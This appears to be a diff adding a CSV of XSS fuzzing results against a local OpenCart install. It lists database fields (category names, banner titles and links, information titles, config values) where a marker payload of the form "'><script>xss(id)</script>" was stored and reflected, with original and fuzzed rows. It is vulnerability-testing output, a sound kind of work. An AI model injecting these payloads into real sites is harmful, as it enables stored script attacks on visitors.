@@ -1,0 +1,595 @@
+web app,DB source,reflection sink,id,payload,description
+opencart,oc_category_description.name,http://localhost/,900883,"""'><script>xss(900883)</script>","
+            opencart.oc_category_description.name[11][2]
+            original row: [32, 1, 'Web Cameras', '', 'Web Cameras', '', '']
+            fuzzed row: [32, 1, '""\'><script>xss(900883)</script>', '', 'Web Cameras', '', '']
+            change: 'Web Cameras' => '""'><script>xss(900883)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,901712,"""'><script>xss(901712)</script>","
+            opencart.oc_banner_image.title[1][3]
+            original row: [80, 7, 1, 'MacBookAir', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
+            fuzzed row: [80, 7, 1, '""\'><script>xss(901712)</script>', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
+            change: 'MacBookAir' => '""'><script>xss(901712)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,902069,"""'><script>xss(902069)</script>","
+            opencart.oc_category_description.name[5][2]
+            original row: [26, 1, 'PC', '', 'PC', '', '']
+            fuzzed row: [26, 1, '""\'><script>xss(902069)</script>', '', 'PC', '', '']
+            change: 'PC' => '""'><script>xss(902069)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,903292,"""'><script>xss(903292)</script>","
+            opencart.oc_category_description.name[19][2]
+            original row: [40, 1, 'test 7', '', 'test 7', '', '']
+            fuzzed row: [40, 1, '""\'><script>xss(903292)</script>', '', 'test 7', '', '']
+            change: 'test 7' => '""'><script>xss(903292)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,903376,"""'><script>xss(903376)</script>","
+            opencart.oc_banner_image.link[4][4]
+            original row: [89, 8, 1, 'Dell', '', 'catalog/demo/manufacturer/dell.png', 0]
+            fuzzed row: [89, 8, 1, 'Dell', '""\'><script>xss(903376)</script>', 'catalog/demo/manufacturer/dell.png', 0]
+            change: '' => '""'><script>xss(903376)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_banner_image.title,http://localhost/,903959,"""'><script>xss(903959)</script>","
+            opencart.oc_banner_image.title[0][3]
+            original row: [79, 7, 1, 'iPhone 6', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
+            fuzzed row: [79, 7, 1, '""\'><script>xss(903959)</script>', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
+            change: 'iPhone 6' => '""'><script>xss(903959)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,905544,"""'><script>xss(905544)</script>","
+            opencart.oc_category_description.name[17][2]
+            original row: [38, 1, 'test 4', '', 'test 4', '', '']
+            fuzzed row: [38, 1, '""\'><script>xss(905544)</script>', '', 'test 4', '', '']
+            change: 'test 4' => '""'><script>xss(905544)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,906790,"""'><script>xss(906790)</script>","
+            opencart.oc_category_description.name[20][2]
+            original row: [41, 1, 'test 8', '', 'test 8', '', '']
+            fuzzed row: [41, 1, '""\'><script>xss(906790)</script>', '', 'test 8', '', '']
+            change: 'test 8' => '""'><script>xss(906790)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_product_description.name,http://localhost/,906912,"""'><script>xss(906912)</script>","
+            opencart.oc_product_description.name[9][2]
+            original row: [40, 1, 'iPhone', '&lt;p class=&quot;intro&quot;&gt;\r\n\tiPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', '', 'iPhone', '', '']
+            fuzzed row: [40, 1, '""\'><script>xss(906912)</script>', '&lt;p class=&quot;intro&quot;&gt;\r\n\tiPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', '', 'iPhone', '', '']
+            change: 'iPhone' => '""'><script>xss(906912)</script>'
+            
+fuzzed after scan 214 / 625
+found as XSS in scan 215 / 625"
+opencart,oc_category_description.name,http://localhost/,907897,"""'><script>xss(907897)</script>","
+            opencart.oc_category_description.name[36][2]
+            original row: [57, 1, 'Tablets', '', 'Tablets', '', '']
+            fuzzed row: [57, 1, '""\'><script>xss(907897)</script>', '', 'Tablets', '', '']
+            change: 'Tablets' => '""'><script>xss(907897)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,908490,"""'><script>xss(908490)</script>","
+            opencart.oc_category_description.name[3][2]
+            original row: [24, 1, 'Phones &amp; PDAs', '', 'Phones &amp; PDAs', '', '']
+            fuzzed row: [24, 1, '""\'><script>xss(908490)</script>', '', 'Phones &amp; PDAs', '', '']
+            change: 'Phones &amp; PDAs' => '""'><script>xss(908490)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_product_description.name,http://localhost/,910852,"""'><script>xss(910852)</script>","
+            opencart.oc_product_description.name[2][2]
+            original row: [30, 1, 'Canon EOS 5D', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
+            fuzzed row: [30, 1, '""\'><script>xss(910852)</script>', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
+            change: 'Canon EOS 5D' => '""'><script>xss(910852)</script>'
+            
+fuzzed after scan 214 / 625
+found as XSS in scan 215 / 625"
+opencart,oc_category_description.name,http://localhost/,911951,"""'><script>xss(911951)</script>","
+            opencart.oc_category_description.name[10][2]
+            original row: [31, 1, 'Scanners', '', 'Scanners', '', '']
+            fuzzed row: [31, 1, '""\'><script>xss(911951)</script>', '', 'Scanners', '', '']
+            change: 'Scanners' => '""'><script>xss(911951)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,912783,"""'><script>xss(912783)</script>","
+            opencart.oc_category_description.name[4][2]
+            original row: [25, 1, 'Components', '', 'Components', '', '']
+            fuzzed row: [25, 1, '""\'><script>xss(912783)</script>', '', 'Components', '', '']
+            change: 'Components' => '""'><script>xss(912783)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_setting.value,http://localhost/,913057,"""'><script>xss(913057)</script>","
+            opencart.oc_setting.value[6][4]
+            original row: [7, 0, 'config', 'config_meta_description', 'My Store', 0]
+            fuzzed row: [7, 0, 'config', 'config_meta_description', '""\'><script>xss(913057)</script>', 0]
+            change: 'My Store' => '""'><script>xss(913057)</script>'
+            
+fuzzed after scan 367 / 625
+found as XSS in scan 368 / 625"
+opencart,oc_information_description.title,http://localhost/,914070,"""'><script>xss(914070)</script>","
+            opencart.oc_information_description.title[0][2]
+            original row: [1, 1, 'About Us', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
+            fuzzed row: [1, 1, '""\'><script>xss(914070)</script>', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
+            change: 'About Us' => '""'><script>xss(914070)</script>'
+            
+fuzzed after scan 118 / 625
+found as XSS in scan 119 / 625"
+opencart,oc_category_description.name,http://localhost/,914500,"""'><script>xss(914500)</script>","
+            opencart.oc_category_description.name[29][2]
+            original row: [50, 1, 'test 18', '', 'test 18', '', '']
+            fuzzed row: [50, 1, '""\'><script>xss(914500)</script>', '', 'test 18', '', '']
+            change: 'test 18' => '""'><script>xss(914500)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,914643,"""'><script>xss(914643)</script>","
+            opencart.oc_category_description.name[33][2]
+            original row: [54, 1, 'test 22', '', 'test 22', '', '']
+            fuzzed row: [54, 1, '""\'><script>xss(914643)</script>', '', 'test 22', '', '']
+            change: 'test 22' => '""'><script>xss(914643)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,916203,"""'><script>xss(916203)</script>","
+            opencart.oc_banner_image.link[13][4]
+            original row: [98, 8, 1, 'Nintendo', '', 'catalog/demo/manufacturer/nintendo.png', 0]
+            fuzzed row: [98, 8, 1, 'Nintendo', '""\'><script>xss(916203)</script>', 'catalog/demo/manufacturer/nintendo.png', 0]
+            change: '' => '""'><script>xss(916203)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,919743,"""'><script>xss(919743)</script>","
+            opencart.oc_category_description.name[8][2]
+            original row: [29, 1, 'Mice and Trackballs', '', 'Mice and Trackballs', '', '']
+            fuzzed row: [29, 1, '""\'><script>xss(919743)</script>', '', 'Mice and Trackballs', '', '']
+            change: 'Mice and Trackballs' => '""'><script>xss(919743)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,919867,"""'><script>xss(919867)</script>","
+            opencart.oc_banner_image.title[10][3]
+            original row: [95, 8, 1, 'RedBull', '', 'catalog/demo/manufacturer/redbull.png', 0]
+            fuzzed row: [95, 8, 1, '""\'><script>xss(919867)</script>', '', 'catalog/demo/manufacturer/redbull.png', 0]
+            change: 'RedBull' => '""'><script>xss(919867)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,920168,"""'><script>xss(920168)</script>","
+            opencart.oc_category_description.name[1][2]
+            original row: [18, 1, 'Laptops &amp; Notebooks', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'Laptops &amp; Notebooks', '', '']
+            fuzzed row: [18, 1, '""\'><script>xss(920168)</script>', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'Laptops &amp; Notebooks', '', '']
+            change: 'Laptops &amp; Notebooks' => '""'><script>xss(920168)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,921026,"""'><script>xss(921026)</script>","
+            opencart.oc_banner_image.title[9][3]
+            original row: [94, 8, 1, 'NFL', '', 'catalog/demo/manufacturer/nfl.png', 0]
+            fuzzed row: [94, 8, 1, '""\'><script>xss(921026)</script>', '', 'catalog/demo/manufacturer/nfl.png', 0]
+            change: 'NFL' => '""'><script>xss(921026)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_banner_image.title,http://localhost/,921628,"""'><script>xss(921628)</script>","
+            opencart.oc_banner_image.title[4][3]
+            original row: [89, 8, 1, 'Dell', '', 'catalog/demo/manufacturer/dell.png', 0]
+            fuzzed row: [89, 8, 1, '""\'><script>xss(921628)</script>', '', 'catalog/demo/manufacturer/dell.png', 0]
+            change: 'Dell' => '""'><script>xss(921628)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,924228,"""'><script>xss(924228)</script>","
+            opencart.oc_category_description.name[28][2]
+            original row: [49, 1, 'test 17', '', 'test 17', '', '']
+            fuzzed row: [49, 1, '""\'><script>xss(924228)</script>', '', 'test 17', '', '']
+            change: 'test 17' => '""'><script>xss(924228)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,924454,"""'><script>xss(924454)</script>","
+            opencart.oc_banner_image.link[7][4]
+            original row: [92, 8, 1, 'Burger King', '', 'catalog/demo/manufacturer/burgerking.png', 0]
+            fuzzed row: [92, 8, 1, 'Burger King', '""\'><script>xss(924454)</script>', 'catalog/demo/manufacturer/burgerking.png', 0]
+            change: '' => '""'><script>xss(924454)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_banner_image.title,http://localhost/,927156,"""'><script>xss(927156)</script>","
+            opencart.oc_banner_image.title[7][3]
+            original row: [92, 8, 1, 'Burger King', '', 'catalog/demo/manufacturer/burgerking.png', 0]
+            fuzzed row: [92, 8, 1, '""\'><script>xss(927156)</script>', '', 'catalog/demo/manufacturer/burgerking.png', 0]
+            change: 'Burger King' => '""'><script>xss(927156)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,928735,"""'><script>xss(928735)</script>","
+            opencart.oc_category_description.name[31][2]
+            original row: [52, 1, 'test 20', '', 'test 20', '', '']
+            fuzzed row: [52, 1, '""\'><script>xss(928735)</script>', '', 'test 20', '', '']
+            change: 'test 20' => '""'><script>xss(928735)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,929645,"""'><script>xss(929645)</script>","
+            opencart.oc_banner_image.title[3][3]
+            original row: [88, 8, 1, 'Harley Davidson', '', 'catalog/demo/manufacturer/harley.png', 0]
+            fuzzed row: [88, 8, 1, '""\'><script>xss(929645)</script>', '', 'catalog/demo/manufacturer/harley.png', 0]
+            change: 'Harley Davidson' => '""'><script>xss(929645)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,933977,"""'><script>xss(933977)</script>","
+            opencart.oc_category_description.name[16][2]
+            original row: [37, 1, 'test 5', '', 'test 5', '', '']
+            fuzzed row: [37, 1, '""\'><script>xss(933977)</script>', '', 'test 5', '', '']
+            change: 'test 5' => '""'><script>xss(933977)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,934957,"""'><script>xss(934957)</script>","
+            opencart.oc_category_description.name[13][2]
+            original row: [34, 1, 'MP3 Players', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
+            fuzzed row: [34, 1, '""\'><script>xss(934957)</script>', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
+            change: 'MP3 Players' => '""'><script>xss(934957)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,935226,"""'><script>xss(935226)</script>","
+            opencart.oc_category_description.name[0][2]
+            original row: [17, 1, 'Software', '', 'Software', '', '']
+            fuzzed row: [17, 1, '""\'><script>xss(935226)</script>', '', 'Software', '', '']
+            change: 'Software' => '""'><script>xss(935226)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,935329,"""'><script>xss(935329)</script>","
+            opencart.oc_banner_image.link[3][4]
+            original row: [88, 8, 1, 'Harley Davidson', '', 'catalog/demo/manufacturer/harley.png', 0]
+            fuzzed row: [88, 8, 1, 'Harley Davidson', '""\'><script>xss(935329)</script>', 'catalog/demo/manufacturer/harley.png', 0]
+            change: '' => '""'><script>xss(935329)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_banner_image.title,http://localhost/,936949,"""'><script>xss(936949)</script>","
+            opencart.oc_banner_image.title[6][3]
+            original row: [91, 8, 1, 'Coca Cola', '', 'catalog/demo/manufacturer/cocacola.png', 0]
+            fuzzed row: [91, 8, 1, '""\'><script>xss(936949)</script>', '', 'catalog/demo/manufacturer/cocacola.png', 0]
+            change: 'Coca Cola' => '""'><script>xss(936949)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_information_description.title,http://localhost/,938121,"""'><script>xss(938121)</script>","
+            opencart.oc_information_description.title[2][2]
+            original row: [3, 1, 'Privacy Policy', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
+            fuzzed row: [3, 1, '""\'><script>xss(938121)</script>', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
+            change: 'Privacy Policy' => '""'><script>xss(938121)</script>'
+            
+fuzzed after scan 118 / 625
+found as XSS in scan 119 / 625"
+opencart,oc_category_description.name,http://localhost/,939775,"""'><script>xss(939775)</script>","
+            opencart.oc_category_description.name[34][2]
+            original row: [55, 1, 'test 23', '', 'test 23', '', '']
+            fuzzed row: [55, 1, '""\'><script>xss(939775)</script>', '', 'test 23', '', '']
+            change: 'test 23' => '""'><script>xss(939775)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,941479,"""'><script>xss(941479)</script>","
+            opencart.oc_banner_image.title[13][3]
+            original row: [98, 8, 1, 'Nintendo', '', 'catalog/demo/manufacturer/nintendo.png', 0]
+            fuzzed row: [98, 8, 1, '""\'><script>xss(941479)</script>', '', 'catalog/demo/manufacturer/nintendo.png', 0]
+            change: 'Nintendo' => '""'><script>xss(941479)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,941613,"""'><script>xss(941613)</script>","
+            opencart.oc_category_description.name[24][2]
+            original row: [45, 1, 'Windows', '', 'Windows', '', '']
+            fuzzed row: [45, 1, '""\'><script>xss(941613)</script>', '', 'Windows', '', '']
+            change: 'Windows' => '""'><script>xss(941613)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_product_description.name,http://localhost/,942919,"""'><script>xss(942919)</script>","
+            opencart.oc_product_description.name[12][2]
+            original row: [43, 1, 'MacBook', '&lt;div&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tPowered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tThe new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tMacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tRight out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', 'MacBook', '', '']
+            fuzzed row: [43, 1, '""\'><script>xss(942919)</script>', '&lt;div&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tPowered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tThe new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tMacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tRight out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', 'MacBook', '', '']
+            change: 'MacBook' => '""'><script>xss(942919)</script>'
+            
+fuzzed after scan 214 / 625
+found as XSS in scan 215 / 625"
+opencart,oc_category_description.name,http://localhost/,946118,"""'><script>xss(946118)</script>","
+            opencart.oc_category_description.name[21][2]
+            original row: [42, 1, 'test 9', '', 'test 9', '', '']
+            fuzzed row: [42, 1, '""\'><script>xss(946118)</script>', '', 'test 9', '', '']
+            change: 'test 9' => '""'><script>xss(946118)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,947348,"""'><script>xss(947348)</script>","
+            opencart.oc_banner_image.link[5][4]
+            original row: [90, 8, 1, 'Disney', '', 'catalog/demo/manufacturer/disney.png', 0]
+            fuzzed row: [90, 8, 1, 'Disney', '""\'><script>xss(947348)</script>', 'catalog/demo/manufacturer/disney.png', 0]
+            change: '' => '""'><script>xss(947348)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_information_description.title,http://localhost/,947904,"""'><script>xss(947904)</script>","
+            opencart.oc_information_description.title[1][2]
+            original row: [2, 1, 'Terms &amp; Conditions', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
+            fuzzed row: [2, 1, '""\'><script>xss(947904)</script>', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
+            change: 'Terms &amp; Conditions' => '""'><script>xss(947904)</script>'
+            
+fuzzed after scan 118 / 625
+found as XSS in scan 119 / 625"
+opencart,oc_category_description.name,http://localhost/,949005,"""'><script>xss(949005)</script>","
+            opencart.oc_category_description.name[7][2]
+            original row: [28, 1, 'Monitors', '', 'Monitors', '', '']
+            fuzzed row: [28, 1, '""\'><script>xss(949005)</script>', '', 'Monitors', '', '']
+            change: 'Monitors' => '""'><script>xss(949005)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,950792,"""'><script>xss(950792)</script>","
+            opencart.oc_category_description.name[2][2]
+            original row: [20, 1, 'Desktops', '&lt;p&gt;\r\n\tExample of category description text&lt;/p&gt;\r\n', 'Desktops', 'Example of category description', '']
+            fuzzed row: [20, 1, '""\'><script>xss(950792)</script>', '&lt;p&gt;\r\n\tExample of category description text&lt;/p&gt;\r\n', 'Desktops', 'Example of category description', '']
+            change: 'Desktops' => '""'><script>xss(950792)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_setting.value,http://localhost/,951416,"""'><script>xss(951416)</script>","
+            opencart.oc_setting.value[92][4]
+            original row: [94, 0, 'config', 'config_telephone', '123456789', 0]
+            fuzzed row: [94, 0, 'config', 'config_telephone', '""\'><script>xss(951416)</script>', 0]
+            change: '123456789' => '""'><script>xss(951416)</script>'
+            
+fuzzed after scan 368 / 625
+found as XSS in scan 369 / 625"
+opencart,oc_banner_image.link,http://localhost/,952735,"""'><script>xss(952735)</script>","
+            opencart.oc_banner_image.link[0][4]
+            original row: [79, 7, 1, 'iPhone 6', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
+            fuzzed row: [79, 7, 1, 'iPhone 6', '""\'><script>xss(952735)</script>', 'catalog/demo/banners/iPhone6.jpg', 0]
+            change: 'index.php?route=product/product&amp;path=57&amp;product_id=49' => '""'><script>xss(952735)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_banner_image.link,http://localhost/,955657,"""'><script>xss(955657)</script>","
+            opencart.oc_banner_image.link[10][4]
+            original row: [95, 8, 1, 'RedBull', '', 'catalog/demo/manufacturer/redbull.png', 0]
+            fuzzed row: [95, 8, 1, 'RedBull', '""\'><script>xss(955657)</script>', 'catalog/demo/manufacturer/redbull.png', 0]
+            change: '' => '""'><script>xss(955657)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,958678,"""'><script>xss(958678)</script>","
+            opencart.oc_category_description.name[32][2]
+            original row: [53, 1, 'test 21', '', 'test 21', '', '']
+            fuzzed row: [53, 1, '""\'><script>xss(958678)</script>', '', 'test 21', '', '']
+            change: 'test 21' => '""'><script>xss(958678)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,959099,"""'><script>xss(959099)</script>","
+            opencart.oc_banner_image.title[11][3]
+            original row: [96, 8, 1, 'Sony', '', 'catalog/demo/manufacturer/sony.png', 0]
+            fuzzed row: [96, 8, 1, '""\'><script>xss(959099)</script>', '', 'catalog/demo/manufacturer/sony.png', 0]
+            change: 'Sony' => '""'><script>xss(959099)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_banner_image.link,http://localhost/,959919,"""'><script>xss(959919)</script>","
+            opencart.oc_banner_image.link[11][4]
+            original row: [96, 8, 1, 'Sony', '', 'catalog/demo/manufacturer/sony.png', 0]
+            fuzzed row: [96, 8, 1, 'Sony', '""\'><script>xss(959919)</script>', 'catalog/demo/manufacturer/sony.png', 0]
+            change: '' => '""'><script>xss(959919)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,960836,"""'><script>xss(960836)</script>","
+            opencart.oc_category_description.name[18][2]
+            original row: [39, 1, 'test 6', '', 'test 6', '', '']
+            fuzzed row: [39, 1, '""\'><script>xss(960836)</script>', '', 'test 6', '', '']
+            change: 'test 6' => '""'><script>xss(960836)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,961361,"""'><script>xss(961361)</script>","
+            opencart.oc_category_description.name[35][2]
+            original row: [56, 1, 'test 24', '', 'test 24', '', '']
+            fuzzed row: [56, 1, '""\'><script>xss(961361)</script>', '', 'test 24', '', '']
+            change: 'test 24' => '""'><script>xss(961361)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,962653,"""'><script>xss(962653)</script>","
+            opencart.oc_category_description.name[30][2]
